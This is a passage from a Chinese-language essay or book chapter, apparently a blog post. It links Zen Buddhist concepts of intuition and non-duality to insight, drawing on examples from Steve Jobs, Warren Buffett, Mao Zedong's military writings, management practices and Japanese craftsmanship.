直觉力</h4><p>我把洞察力分为直觉力和逻辑能力，直觉力是指追随你的内心的指引，不经过逻辑推理而把握本质的能力。我这里把直觉力的范围作一些限制，指研究本质或者规律这个层面，普通的一些事情，例如决定日常生活的一些琐事就不在我们的研究范围里了。逻辑能力我们都很熟悉，我们从小就接受严格的培养，而直觉力很神秘，来去无踪，很难把握。乔布斯的直觉力是非常强大的，他自己说过，很多重大的决策，他都是凭直觉作出来的。乔布斯17岁的时候曾经去印度寻找圣人寻求精神解脱，若干年后他回顾了那趟旅程对他的影响，其中特别谈到了直觉：</p>\n<blockquote>\n<p>“我回到美国之后感受到的文化冲击，比我去印度时感受到的还要强烈。印度乡间的人与我们不同，我们运用思维，而他们运用直觉，他们的直觉比世界上其他地方的人要发达得多。直觉是非常强大的，在我看来比思维更加强大。直觉对我的工作有很大的影响。”</p>\n</blockquote>\n<p>1983年乔布斯在一个采访中说：“我跟着我的直觉和好奇心走，遇到的很多东西，此后被证明是无价之宝。”《乔布斯传》作者在书中写道：“禅修磨练了他对直觉的欣赏能力，教他如何过滤掉任何分散精力或不必要的事情。”乔布斯从小接受良好的西方教育，锻炼了他强大的逻辑思维能力，十七岁起接受东方禅学的训练，锻炼了他非凡的直觉力，两种能力珠联璧合，成就了乔布斯传奇般的洞察力。禅和洞察力尤其是直觉力的关系，我们可以从以下几个角度分析。</p>\n<p>禅认为思考问题的时候，不要被事物的表象所迷惑，而是要深入探讨它的因缘，了解支持事物成立的条件以及为什么会以这样的一种状态生起，而且是以动态的、变化的角度去思考。这种思维的方式，对于洞察事物的本质是至关重要的。我研究过某些宗教，它们往往强调信众要非常”Trust(信赖)” 神，根据神订下的一些原则和契约执行就够了，不能说谁比谁高明，但禅是特别强调人的独立的深层次的思考。</p>\n<p>中国禅宗与别的宗派的区别就是特别重视直觉力，六祖说：“一刹那间妄念俱灭”，他说他自己的经历“我于忍和尚处（指在五祖那里），一闻言下便悟，顿见真如本性”，说的就是凭着直觉，一刹那顿悟佛法，禅宗的禅法是“教外别传，不立文字，直指人心，见性成佛”，强调的就要摆脱文字、语言等的限制，以心传心，凭直觉直接证悟，可以说，在禅看来，直觉的智慧不开启，是不可能证悟成佛的。每一位禅宗信徒的修行，从某一个角度看，是在锻炼他们的直觉力，直觉力强大了，才有可能顿悟，对禅的领悟越深，直觉力也就越高，高到一定程度，他就能突破各种束缚，见性成佛。</p>\n<p>思考一件事情的本质，首先要具备相关的知识，我们通过持续学习形成了每个人独特的知识架构，我们的直觉力和逻辑力与我们的知识架构密切相关。我们先来考察一下知识架构，知识架构和下面这张中国铁路干线分布图很像，都是网状结构，其中图中红色的五条纵向干线和黑色的三条横向干线是主干线（称为“五纵三横”），我用来代表我们最擅长的几个领域的知识，另外，图中还有密密麻麻的大量中小支干线，紧密连接着主干线，我用来代表其他的各种知识，知识与知识之间相互交叉相互渗透，形成我们完整的知识架构。查理芒格主张，我们要学习很多不同学科的知识，掌握精髓，融会贯通，他说：</p>\n<blockquote>\n<p>“你必须知道主要学科中的主要理论并有规律地用到这些理论——是所有理论而不是其中一些理论。多数人只在一个模型中接受教育，比如经济学——并试图使用一种方法来解决问题。”  </p>\n</blockquote>\n<p>芒格把这个理论称为知识“格栅理论”，其内涵和这张铁路干线图基本是一样的。</p>\n<p>从这张干线图上的一个站点到另一个站点，即使隔得很远，只要多转车几次，总能达到，这种运输能力和我们的逻辑思维能力很相似，因为都有成熟的清晰的路径可供利用，铁路网越庞大越复杂，一般代表运输能力越强，同样地，我们的知识架构越庞大越复杂，一般也代表我们的逻辑思维能力越强大。在这张图上，如果要增加一个新站点，该怎么做呢？</p>\n<p>我们先找到离这个新站点很近的一个老站点，然后铺设一段较短的铁轨就可以把新老站点连上了，铁路网越庞大越复杂，意味这个老站点越好找，成功的机率就越高。这个过程我觉得和直觉思维很相似，对一个新事物进行直觉判断，需要有一个思考的原点，这个原点在你的知识架构之内，和新事物相关度比较高或者说“离得比较近”，然后在两点间寻找一个“一步跨越”的机会，所谓直觉就是这样的一个过程，原来的知识架构越复杂越庞大，这个思考的原点就越容易找到，“一步跨越”的成功机率就越大。</p>\n<p>举两个例子，乔布斯当年亲自设计了拥有革命性的图形界面的麦金塔电脑的漂亮字体，其灵感源于十年前他退学后在里德学院旁听时学习的书法字体。巴菲特所在城市有一家当地最大、口碑最好的家具店，由B夫人以500元白手起家发展壮大，当她决定向巴菲特出售股份的时候，巴菲特没有查公司账本，没有做尽职调查，一口就答应了，这是一个很好的用直觉做决定的例子，为什么做这个决策？巴菲特在年报解释说：</p>\n<blockquote>\n<p>“我对这个家族与其事业已欣赏了数十年。”</p>\n<p>“当我们在评断一家公司的企业价值时，我常常会问自己一个问题: “假设我有足够的资金与人才时，我愿不愿意和这家公司竞争”，我宁愿和大灰熊摔角也不愿和B太太家族竞争，他们采购非常有一套，经营费用低到其竞争对手想都想不到的程度，然后再将所省下的每一分钱回馈给客人，这是一家理想中的企业，建立在为客户创造价值并转化为对所有者的经济利益的基础上。”</p>\n</blockquote>\n<p>这样的企业以及经营者是巴菲特研究公司几十年来最喜欢的类型，因此当出现交易机会时，巴菲特即刻就能凭直觉决定了。</p>\n<p>以上两个例子说明，所谓直觉思维其实不是从天上掉下来的，和长期知识的精心积累，从而拥有良好的知识架构有非常重大的关系。洞察本质需要直觉力和逻辑能力一起配合来完成，逻辑能力通过分析事情的各项属性，不断接近本质，有点类似禅说的“渐修”，按禅的理论，渐修是无法直接证得的，最后“一步跨越”的那一步，看似一小步，但却是巨大飞跃的一步，只有通过激发直觉力，打破逻辑所营造的各种条条框框，瞬间的全部的获得，我们才能把握本质，这个意义上，直觉力类似禅的顿悟。</p>\n<p>再换一个角度看直觉，直觉力强大的人，有一个共同特质就是敏感度很高，所关心的领域的一点细微的变动，他都不会放过，如果出现了重大的变动，尤其是在转折关头，他往往能比别人更早地洞察先机，这是非常重大的能力。禅常把我们的心比做一面光明澄彻的镜子，非常灵敏，可以反映世间万物的本来面目，但是由于世人无明，这面镜子蒙上了厚厚的尘垢以至黯淡无光，反应就会变得迟钝，禅修是很好的法门，能帮助我们去除污垢让镜子重焕光明。乔布斯说他的坐禅体验：</p>\n<blockquote>\n<p>“如果你坐下来静静观察，你会发现自己的心灵有多焦躁。如果你想平静下来，那情况只会更糟，但是时间久了之后总会平静下来，心里就会有空间让你聆听更加微妙的东西——这时你的直觉就开始发展，你看事情会更加透彻，也更能感受现实的环境。你的心灵逐渐平静下来，你的视界会极大地延伸。你能看到之前看不到的东西。这是一种修行，你必须不断练习。”</p>\n</blockquote>\n<p>乔布斯的禅修心得非常珍贵，我们一天繁乱工作然后下班回到家，内心塞满了各种观念、执念、成见，还有各种各样的喧嚣的情绪，如愤怒、妒忌、失望等等，这些东西就像镜子里的那些厚厚的污垢，坐禅的时候，你内心专注而宁静，那些污垢就像冬日里被阳光照射的雪人，一点点就融化了，我们的心会逐渐回复明亮和清澈，打个比方，坐禅相当于电脑“Reset”了一次，恍若重生，回到这样状态的一颗心，会发生一些非常细微的变化，你的内心会变得更加敏锐，正如乔布斯所说的：“你看事情会更加透彻，也更能感受现实的环境。”你的直觉也会静静生起，正如乔布斯所说的：“你的视界会极大地延伸。你能看到之前看不到的东西。”坐禅确实是一种神秘的妙不可言的体验，不亲自尝试，你永远不可能明白。</p>\n<h4 id=\"2-不二\"><a href=\"#2-不二\" class=\"headerlink\" title=\"2. 不二\"></a>2. 不二</h4><p>“不二”的意思是指平等而无差别，佛法八万四千法门，不二法门被推崇为至高法门，它超越一切差别而直指本质，是洞察力的最高境界，因此我放在本章来讨论，传统解说高深莫测，我尝试用简明易懂的方式向大家介绍。</p>\n<p>（1）超越对立</p>\n<p>“不二”通俗来说，是指一些比较重大的看起来非常对立的观念，在更高的维度看其实是一致的。例如生死，非常对立，但是在更高的维度看，由于有死，我们才会珍惜生命，才会思考生的意义，没有死，生就味同嚼蜡，同时，旧事物的死去，给新事物的诞生创造机会，死是生的契机，生是死的延续。乔布斯早已参透了“生死不二”，他说：</p>\n<blockquote>\n<p>“人必有一死，你我都无法逃脱。这也本该如此，因为‘死亡’很可能就是‘生命’中最杰出的发明。它是生命的轮回，它为新生事物清理道路。”</p>\n</blockquote>\n<p>我们认识生死不二，并不仅仅是一种纯粹的精神感悟，而是有重大的现实指导意义的，乔布斯正是运用这个“生死不二法门”来指导他洞察生命的意义，他说：</p>\n<blockquote>\n<p>“每个早晨，我都会对着镜子问自己：‘如果今天是我生命中的最后一天，你会不会完成你今天想做的事情呢?’如果连续几天的答案都是‘不’的时候，我知道我要做些改变了。”</p>\n<p>“谨记我随时死去，这是我一生中遇到的最有帮助的工具，它帮我作出了生命中重要的抉择。因为几乎所有的事情，包括所有的荣誉、所有的骄傲、来自难堪和失败所有的恐惧，这些在死亡面前统统消亡，剩下的爱是真正重要的东西。”</p>\n</blockquote>\n<p>乔布斯告诉大家，你的梦想是什么，你的人生中最重要的事情是什么，只有在直面生死的时候，你才可能知道。</p>\n<p>这个世界从表象或者概念看存在太多的分别，例如美丑、愚智、空色、强弱等等，其实质都是聚合在一起的一些因缘（条件）在不同环境下所呈现出来的不同的形态，这些差别有很多种不同的情况，可以分为纯概念（《坛经》称为法相语言）和现实性两种，纯概念主要是指与空性的理解直接相关的一些概念，如空色、有无、真实与幻象等，很抽象但很重要，我在前面几章对空色的不二、真实与幻象的不二作了分析，都是从空性的概念着手层层递进，用这种思路去分析其他的这些分别也很适合，本章主要探讨的是日常工作生活中，也就是现实性的一些分别，主要可以分为三类，第一类属于个人主观感受，例如美丑、喜嗔、愚智等，举个例子，一般中国人可能认为范冰冰比凤姐漂亮，但是看过一个采访，有些美国黑人就认为凤姐比范冰冰漂亮多了，可见美丑是一件非常主观的事情；第二类属于相对而非绝对的范畴，例如长短、大小、明暗等，以长短为例，长与短是相对的，并没有绝对的标准，没有最短，只有更短，没有最长，只有更长。</p>\n<p>第一类和第二类理解起来都不太复杂，我就不展开论述了。第三种是在一定条件下可以互相转化的，例如强弱、生死、常与无常、烦恼与菩提等，我们日常工作中经常遇上，既给我们带来了巨大的烦恼，也给我们带来了巨大的机会，我重点分析一下。</p>\n<p>先分析强弱，强与弱天然对立，但在更高的维度上看，强弱实质上只是对立双方力量不断消长的某个时点的现状，暂时占优的一方叫强，暂时处于劣势的一方叫弱，强弱也分全部和局部，弱的一方不是全部各个部分都弱，某些局部它可能比对手强。强弱是可以相互转化的，中国人说盛极必衰、否极泰来，说的是强弱到了某一个极限，量变引发质变，弱者变强，强者变弱，这就是强弱不二的主要内涵。</p>\n<p>知道这个道理有什么用呢？它是可以指导我们的工作的，例如，它可以指导我们根据实力消长情况，灵活制定对策，举个例子，在抗日战争时期，毛泽东主席在他的经典著作《论持久战》写道，抗日战争是一场持久战，目前日本是强的一方，但它是一个小国，失道寡助，经不起长期的战争，中国是弱的一方，得道多助，能够支持长期的战争，文章把这场持久战分为三个阶段：</p>\n<p>“第一个阶段，是敌之战略进攻、我之战略防御的时期。第二个阶段，是敌之战略保守、我之准备反攻的时期。第三个阶段，是我之战略反攻、敌之战略退却的时期。”</p>\n<p>在不同战争阶段我们将采取不同的对策，例如他指出第二阶段是整个战争敌强我弱形势“转变的枢纽”，敌方力量虽然受到重挫，采取守势，但仍然很强，我方的力量在快速增长中，转入进攻，但仍然很弱，“此阶段中我之作战形式主要的是游击战，而以运动战辅助之”，而到了第三阶段，敌方力量大幅下滑，我方力量大幅增长，但总体上敌方力量仍然比我们强，我们仍然不可以头脑发热与敌方发起决战，“这个阶段我所采取的主要的战争形式仍将是运动战，但是阵地战将提到重要地位。”抗战结束后回顾这些光辉论断，不得不为主席的远见卓识由衷佩服。</p>\n<p>再举个例子，强弱不二还可以指导我们如何以弱胜强，还是以毛主席指挥战争为例，当年主席在江西井冈山建立根据地，应对国民党军队的扫荡，成功进行了四次反围剿。主席非常清楚敌人力量百倍强于我们，正面对抗必败无疑，主席的策略是“敌进我退，敌驻我扰”，让敌人疲于奔命，而且会主动引诱敌人的一些小分队进入大山里的一些适合伏击的地方，集中十倍于敌人的兵力，也就是说在某个局部处于绝对强势的地位，对陷入重围的敌人予以致命打击，取得了一场又一场的小型胜利，并积小胜为大胜。强弱不二强调我们制定策略时要持续评估双方力量对比及消长情况，不但在战争中，而且在一切竞争中都有重大的现实指导意义。</p>\n<p>我们再讨论常与无常，佛学认为，世间万事万物不是恒常不变的，是无常的，那么无常中，是否会有“常”的存在呢？答案是一定的，这个“常”，我们一般称为规律，不过，所有规律都是有严格的条件限制的，条件发生改变，这个规律也要调整，甚至不再适用，这个“常”从发现，到发展到消亡，最好地印证了世界的本质是“无常”的，这就是“常与无常不二”，举个例子，牛顿发现了力学的三大定律，极大推动了人类科技的发展，但是后来发现一些天体运动的现象无法用三大定律来解释，爱因斯坦研究后指出，三大定律是受五大条件假设限制的：①空间是绝对的;②时间是连续的、均匀流逝的、无穷无尽的；③时间和空间无关；④时间和运动状态无关；⑤物体的质量和物体的运动状态无关。爱因斯坦提出的广义相对论突破了第一和第二条假设，提出的狭义相对论突破了第三、四、五条假设。</p>\n<p>学禅明白世事无常还远远不够，焦虑仍然如影随形，我们还要努力在无常的世界里找到规律，才能对未来真正生起信心，才能真正免于焦虑。过分强调世事的无常，而不重视如何建立方法论在无常中发现阶段性的规律指导我们的工作生活，就会导致“不可知论”、“努力无用论”，很多人把无常当作自己悲观厌世、懒惰无能和不思进取的借口。有人炒股票亏了钱很痛苦，去寺院求见大师指点，大师很慈祥地对他说，要放下！当时听了好像醍醐灌顶，但回家后发现大师说了和没说一样，他炒股票还是继续亏钱，他还是很痛苦，所以光要他放下没有什么用，他也不可能真正地放下，帮助他增长智慧让他未来投资赚钱才更重要，如果我是这位大师，我还会送他一本巴菲特的传记《滚雪球》，股市是非常动荡的，暴涨暴跌乃为常态，是世事无常最极端的领域之一，但巴菲特在这种无常中发现了规律，简单来说就是“护城河”加上“安全边际”，他以这个看似简单的法门笑傲江湖几十年，如果这位朋友真读懂了这本来书，那么他就掌握了价值投资的规律，以后炒股票赚钱就容易多了，这才真正帮助了他。</p>\n<p>如何在无常中发现常呢？我们必须“心有所住”，支持事物成立的因缘（条件）有很多,我们从中选择一些最重要的因缘（条件）进行研究，即把心“住”在这些条件里，然后构建体系并用实践来验证。</p>\n<p>如何才能找到这些最重要的条件呢？我觉得可以分为两步：第一步，就是《金刚经》说的“无所住而生其心”，一般人的头脑受很多成见、规则、习俗、别人看法、权威意见等等的约束，只会把心“住”于有限的一些条件中，极大约束了我们的想象力和创造力，当我们打破头脑里的各种框框，敢于选择各种条件，哪怕听起来非常匪夷所思的条件，来展开我们的思考，也就是说想怎么“住”就怎么“住”，我们的创造力才会无比强大。第二步，在无限多的各种条件中根据某些方法论选择我们认为最重要的条件。</p>\n<p>以上两个步骤我还是用搭积木房子来举例说明，眼前有无数个积木方块，之前我们受到很多条条框框的影响，只会选用其中的特定的几个方块来搭房子，“无所住而生其心”是让我们明白其实我们可以选择各种各样的方块，有无数种可能的组合，光知道这个大道理还不够，实践中我们还是需要具体选择某些方块，怎么选？方法论是什么？对这个问题佛陀并没有说，为什么没有说呢？因为佛陀教导我们要打破各种框框，打破框框后我们就获得了无限的可能性，如果佛陀说某一种方法最好，那么无限的可能性又变成了一种，那么我们又将再一次陷入了某一种框框里，佛陀不是自相矛盾了吗？</p>\n<p>其实方法论有很多很多以至无数种，适合不同的人，其中我觉得“辩证法”是非常强大的一种，而且能和空性很好地对接，它的基本思路是：它和佛法一样也研究事物存在的条件（因缘），但是它把条件分为两类，一类是促进它发展的，一类是阻碍它发展的，我们要判断哪些条件是主要的，哪些是次要的，我们的心要“住”于何处呢？我们心除了要“住”于主要条件，因为它决定了事物的性质，同时还要“住”于主次双方力量的消长从而灵活制定对策。上面介绍了毛泽东主席的《论持久战》，通过分析抗日战争的时局，展现了辩证法见地最精华的部分，不仅政治和战争，辩证法也能指导经济建设，大家可以看下改革开放以来邓小平的系列文章，充满了辩证法的光辉，近40年来中国经济的巨大成就充分证明了辩证法强大的适应性和非凡的智慧。空性的智慧揭示世事无常，一切皆有可能，要“无所住而生其心”，辩证法的智慧指导我们具体如何选择条件把心“住”下，以寻找“常”即规律，两种智慧结合在一起，我相信会生起更大的智慧。</p>\n<p>研究不二，我们还可以换一种思考的方式：非常对立的两种观念当然会激烈冲突，如果能够在某种条件下和谐共融，就会有非凡效应。举几个例子，一般人对投资的认识是高风险高收益，低风险低收益，有没有可能做到低风险同时高收益呢？而且是长期，听起来不可能，但巴菲特认为低风险和高收益其实是不二的，唯有不二，财富的积累才可持续，如果财富的持续获得要靠高风险，那么就有可能随时失去，他的方法是：研究具有强大护城河优势公司，耐心等待时机，在远被市场低估的情况下（例如市场长期低迷或者投资者由于一些短期的公司利空而极度恐慌卖出等等）买入，就能实现低风险和高收益同时兼得；一个手机能否操作极为简单，但功能极为强大呢？听起来也不可能，乔布斯做到了，iPhone简单到只有一个操作按钮，但功能包罗万有，怎么做到的？原来他在手机里地建立了一个App store，鼓励所有人为苹果手机开发各种应用提供各种功能。</p>\n<p>对于“不二”这样的一种认识给我们投资选股提供了一个新的思路，多年前如果我对“不二”有这种认知，苹果刚出iPhone的时候，我就可能买入它的股票了。我们每一个人都在用微信，微信界面非常简洁，它在几个月前推出了小程序，无须下载，非常方便，小程序是微信发展历史上最重要的一次进化，如果可以成功的话，那么微信的功能就会有一个质的飞跃，前途无量，那么尽管历史上腾讯已经涨了很多，但是仍然可能是一个好的投资标的。</p>\n<p>按这个思路我们畅想一下，如果能让一个人不需要那么努力学习，就能聪明绝顶无所不知，或者能让一个胖子，不需要那么辛苦锻炼或者节食，就能轻松恢复苗条，那么这种机会就是下一个创造超级财富的机会，这可能吗？有人可能想到了人工智能芯片植入人体，或者从基因层面研发减肥技术。</p>\n<p>（2）因应分别</p>\n<p>这个世界处处充满了各种不平等，贫富悬殊，智力差距、身份尊卑有别等等，我们冷眼旁观这个世界，在更高的维度观察各种不平等其实并无分别，也就是“不二”，回到现实这个维度，种种不平等是消失了呢，还是仍然存在？当然是仍然存在的。我们在更高维度证得不二，与我们在现实这个维度观察“二”（此处指分别）是一种什么关系？我们在更高维度证得“不二”，就能对现实这个维度中存在的种种“二”看得更加的清晰，理解得更加深刻，为什么呢？因为所谓证得不二，是指你知道世间当下的种种分别，是在什么具体条件下（因缘）形成的，每一种分别又会在什么具体条件（因缘）发生改变后，随着发生改变甚至出现逆转，也就是说这种分别其实是无常的。</p>\n<p>我们只有把“二”看得了了分明，我们才能根据这种“二”非常理性地制定因应之策，例如，佛陀早就证得了世人佛性不二，但是不同的人的根性分别非常大，非常“二”，“二”到什么程度呢？可以分为八万四千种，因此他准备了八万四千种法门，而不是放之四海而皆准的一种法门，对症入药，度化不同根性的众生。再举个案例，在更高维度证得“强弱不二”，会让我们对当下这个维度强弱情况有更深刻的认识，我们只有非常冷静地评估双方力量的对比情况，才能根据这种不二的智慧提出相应的策略去解决问题。</p>\n<p>佛法说“无分别心”，可能是最被误解的一句话，这句话的意思是不要执著于分别，而不是否定这种分别。有些人错误地理解了这句话，认为这个世界是一个没有分别的世界，四海之内皆兄弟也，与人为善包括豺狼，对敌人和亲人一视同仁，后果可想而知，但有人争辩说，假如我们看到王子和乞丐，难道我们就应该厚此薄彼吗？这种观点似是而非，虽然王子和乞丐身份不同，但我们给他们同样礼遇，源于我们对人性的尊重，是一种主动的选择，不是说知道他们身份不同就一定要分别对待。有人说，只要心中存在分别，就会比较，就会选择，就会产生烦恼，其实你之所以会产生烦恼，不是由于有这种分别，而是你对这种分别非常执著，如果你不执著，你就不会因此烦恼。</p>\n<p>举个例子，黄晓明比我帅，我认识到了，但是我都不在乎，我烦恼什么？某个人投资做得比你好比你有钱，例如巴菲特，你不在意这种差距，你有什么烦恼？但是如果你在意，那么就有烦恼，怎么办呢？通过种种法门，例如打坐冥想否定这种分别有用吗？没有用，有些宗派并不是主张上升到更高的维度去证得不二，而是在当下这个维度否定差别的存在，简单粗暴，但是副作用非常严重，甚至会影响我们对常识的判断、自欺欺人而陷入愚昧，为什么会有这样的教义呢？有些初衷可能是为了能获得平和的心境，有些是为了培养慈悲，但也有些可能是想让信众盲目地满足于现在的生活，哪怕是并不如意的生活。</p>\n<p>回到刚才那个投资差距的问题，我们只有努力学习，深刻洞察投资的本质并在实践中总结规律，才能真正解决这个问题，而且正是由于存在差距，我们才会有动力努力提高自己的能力，智慧才会因此而增长，六祖说“烦恼即菩提”说的就是这个意思。从这个意义上来说，有分别，如果你在意，也就是你执著这个分别，虽然会带来烦恼，但很多时候说明你有奋斗的目标，不是坏事，而是好事，不经历这种烦恼，你就不会有进步，也就是说有烦恼不都是坏事，过分强调不要有分别，不想有任何烦恼，认为这样才心安理得，很多时候只是一些不思进取的人给自己找的一个借口。</p>\n<p>人性对分别是非常敏感的，现实中我们有时候要减少分别，例如，贫富悬殊过大会引发社会动荡，所以政府要运用累进所得税制、遗产税等方法减小财富差距，有时候我们又要加大分别，主要运用在管理方面，如果措施得当，就可能有很好的效果。</p>\n<p>我举三个例子，第一个例子，杰克韦尔奇任职CEO的时候制定了一个非常有名的年终评估制度—强制性的2－7－1法则，业绩在前20％的直接加薪、晋升，业绩在后10％的，没有任何借口，直接被辞退，在中间的70％不变。他是人为地对员工进行区分，并根据结果制定严厉的奖惩制度，看起来残酷，但对提升企业竞争力作用非凡。我想起自己的一个教训，很多年前，我在一个公司做一个小领导，刚学佛理解肤浅，不管别人工作态度如何，对部门所有人一视同仁，将心付出为了别人好，但结果是一塌糊涂，部门效率和执行力都十分低下。二千三百年前，韩非子就指出，人性一方面好逸恶劳，另一方面又趋利避害，通过区分，重赏厚罚，能很大激发人的潜力并有效管理团队，几千年过去了，人性何曾稍变？</p>\n<p>第二个例子，改革开放之初，邓小平洞察到中国人吃了几十年大锅饭，创造财富、发展经济的积极性并没有调动起来，他提出了一个口号“让一部分人先富起来”，出台了一些具体政策包括允许农村包产到户、以厂长承包制为核心的国企改革、鼓励乡企、私企创业发展等，这对千百年来崇尚“不患贫而患不均”的治国理念是非常重大的突破，中国人长期被压抑的聪明才智和创业激情被极大地激发出来，邓小平人为地加大了一下国人的贫富差距，结果是创造了人类经济上前所未有的奇迹；</p>\n<p>第三个例子，乔布斯更是“二”到极点，评价人不是“天才”就是“白痴”，评估产品不是“最好的（the  best）”就是“狗屎（totally shitty）”，没有中间地带。实际上，要拿到产品“最好的”是非常困难的，也许是97分才能拿到，97分以下的都是“狗屎”，他的下属因此被逼到绝境，到了那个境地，退无可退，那么只好把一切框框打破，进行各种大胆的创新，苹果公司那些伟大的产品就是这样来的。</p>\n<p>这让我想起禅宗的一些听起来匪夷所思的故事，禅师会对学生拳打脚踢，当头棒喝，学生受到极大的刺激，在绝境中冲破一切思维的局限从而开悟，这种方法和乔布斯的方法是一致的，乔布斯的下属尽管经常受他责骂，但是几乎所有人都认为，和他在一起工作，是世界上最幸运的事情，因为如果没有乔布斯，他们可能永远都不能够突破自己，去完成那些看似不可能的任务，因此我认为，乔布斯在苹果的角色，其实就是一名禅师，他运用的法门是非常粗暴的非黑即白二分法门，效果非常显著，下属们大彻大悟迅速成长，从这个角度看，我觉得乔布斯可能是全世界最伟大的禅师。</p>\n<p>我举的这三个例子，都是人为制造分别并取得良好效果的案例，当然，这种分别要适度，过度的分别会造成过大的刺激和压力而适得其反。</p>\n<p>综合以上两节，我们会对佛法的“不二”、“分别心”有更全面和更深入的认识。我们不但要在更高维度上证得不二，还要在现实维度上明辩分别，二者兼有，才是最高的智慧，《维摩诘经》中宝积赞叹佛陀说：“能善分别诸法相，于第一义而不动。”表达的是同样意思。一些佛教流派过分强调不二，忽略甚至否定现实的分别，我觉得是有严重缺陷的。不二法门是如此的充满智慧，它不仅仅是禅的至高法门，也是道家的至高法门，《老子》里的一些重要思想，例如“无为而无不为”、“夫不争，故天下莫能与之争。”“知其雄守其雌为天下谷。”“祸者福之所倚，福者祸之所伏。”等，所证悟的也是不二。不二听起来虚无缥缈，好像没什么用，但正如冯友兰所说的，宗教或者哲学是无用之用，以其无用是有大用。</p>\n<h4 id=\"3-小结\"><a href=\"#3-小结\" class=\"headerlink\" title=\"3. 小结\"></a>3. 小结</h4><p>以上从两个角度分析了洞察力，直觉力和空性的感悟直接相关，不二是洞察力的最高境界。上一章我总结在实践中证悟空性有三种主要的方式，介绍了两种，第三种就是：在空性智慧的指引下我们提升自己的洞察力，在研究一件事情时能够洞穿表象，深入探讨它的因缘，从而把握本质，更进一步是总结规律，这是一种非常重要的“证悟空性”的方式，一个人对空性证悟越深，他对本质的认识、对规律的把握就会越深入，深入的程度和空性证悟的境界密切相关。以上介绍了三种证悟空性的方式，第一种是比较传统的方式，比较出世，而另外两种则比较入世，但是这三种方式无分高下，殊道而同归，所证悟空性的境界并无分别。</p>\n<p>探讨至此，我们可以重温一下我在“创新力”一章给证悟空性所下的定义：“一切事物都不是可以独立存在的，都不是常住不变而是在变化中不断发展的，所谓证悟空性，是指通过修行，不但在理论上明白这一点，更要在实践中证明这一点。”传统佛学对如何在日常生活工作中证悟空性语焉不详，令人无所适从，我做的这个研究，就是试图作一个补充和完善，而且，特别有意义的是，我发现证悟空性的这三种方式和我们心力的提升有直接和紧密的联系。</p>\n<p>此外，值得一提的是，一些传统佛教书籍里，很喜欢神化证悟空性，例如会引发什么电闪雷鸣、天降祥瑞等等，其实这些所谓神迹都不过是我们内心的幻象，如梦幻泡影，在我们心力虚弱的时候我们可能需要它，但当我们心力强大的时候，我们就能识破它并且放下它。</p>\n<p>创新力和洞察力这两种力和专注力是什么关系？专注力是一个人心力的基础，可以理解为心的蓄能电池，创新或者洞察本质是非常困难的事情，需要心提供持续的强大的能量才能获得突破，一个人专注力不足，他的创新力或者洞察力要很强几乎是不可能的，但光有专注力还不够，还要对空性有深入的理解，我们的创新力和洞察力才能越练越强，反过来，当我们的洞察力和创新力越来越强的时候，我们心的专注力也会因这种高强度的思考而得到提升。</p>\n<p>我之前提到过，坐禅与行禅是一种很好的锻炼心的专注力的方法，我们要持续坚持。禅与别的一些宗教或者哲学非常不同的地方是，它不仅仅是讲些大道理让我们遵守，它还提供了一套切实可行的修行方法。大家为了锻炼肌肉会去健身房，如果要锻炼自己的心让它变得更强大，可以去禅修，不仅仅指平常的坐禅，更重要的是还包括在日常生活工作中持续练习。心力因禅修而增强的同时，我们的智慧也会显著提升，这听起来好像很神秘，确实，禅是一种不可言说的东西，既朴实又神秘，既理性又感性，既远在天边又近在人心。</p>\n<p>一个入世修行的普通人，立志在工作实践中证悟空性，他在高度专注的情况下，持续提升他的洞察力和创新力，会有一个显著的结果，就是他对他的工作的本质、规律会有越来越深刻的理解，他就越来越有能力进行各种大胆的创新，就越来越有机会在人群中脱颖而出甚至成为大师级的人物我。</p>\n<p>举个日本的例子，六祖的禅宗自唐朝传入日本，极为深刻地影响了日本的文化，日本人把禅传承发展到了新的高度，六祖提倡在世间修行，日本人做到了，他们把禅与自己的工作相融合，并提升到道的境界，例如茶有茶道，花有花道，剑有剑道，以至饮食、建筑、相扑、园艺等等都各有其道。禅学修行六度（修行的六种方法）中的“精进”原意是指修行要非常刻苦用功，凡对众生有利益工作，尽力去做，精进不怠，彼岸自达，在日本逐步演化为“追求极致”，极致的程度印证着精进的程度。</p>\n<p>日本茶圣千利休将心注入地把禅融入一杯茶中，所提出的“和、敬、清、寂”的茶道思想把简简单单的喝茶提高到了前所未有的道的境界，他对茶道进行了大刀阔斧的全方位的改革，利休的遗世名言“吾这宝剑，祖佛共杀。”充分体现了他证悟空性的境界，“祖佛共杀”缘自《临济录》，连佛陀连达摩都可以杀，那还有什么框框是不可以打破的呢？由于茶道本身就是融会了饮食、园艺、建筑、花木、书画、雕刻、陶器、漆器、竹器、礼仪等诸多文化艺术，因此，千利休的这场改革的影响远远超出了茶的本身，扩大到了日本文化的各个方面。</p>\n<p>日本人追求极致完美、一生只做一件事的“匠人精神”响誉世界，就是禅与工作结合后发展的产物，近代日本的“寿司之神”小野二郎和“经营之神”松下幸之助、稻盛和夫等都是匠人精神的传承者，日本禅学近半个世纪积极向世界传播，传到了美国甚至极大地影响到了一个叫乔布斯的人，我认为如果没有日本禅学的修炼，很可能就没有今日的乔布斯。</p>\n<p>今天我们中国人还在为修行佛法的出世入世争论不休的时候，日本的禅学早就解决了这个理论问题并取得了更大的突破，工作即禅修，平凡的工作被提升到道的境界，从此不再平凡，每一个真诚信奉这种工作之道的普通人内心充满了崇高的信念，精益求精，追求极致，他们的人生从此不再普通转而熠熠生辉。日本历史上很多匠人家族传承达数百年甚至一千年，每一代都对“道”心怀敬畏，精益求精，对境界的追求永无止境，这是这些家族绝艺得以传承最重要的原因。今天中国提倡的匠人精神，其实真正的源头在中国的六祖，我们家有珍宝却暴殄天物，是时候重新挖掘提炼了。</p>\n<h2 id=\"第二部分-心力禅见地\"><a href=\"#第二部分-心力禅见地\" class=\"headerlink\" title=\"第二部分 心力禅见地\"></a>第二部分 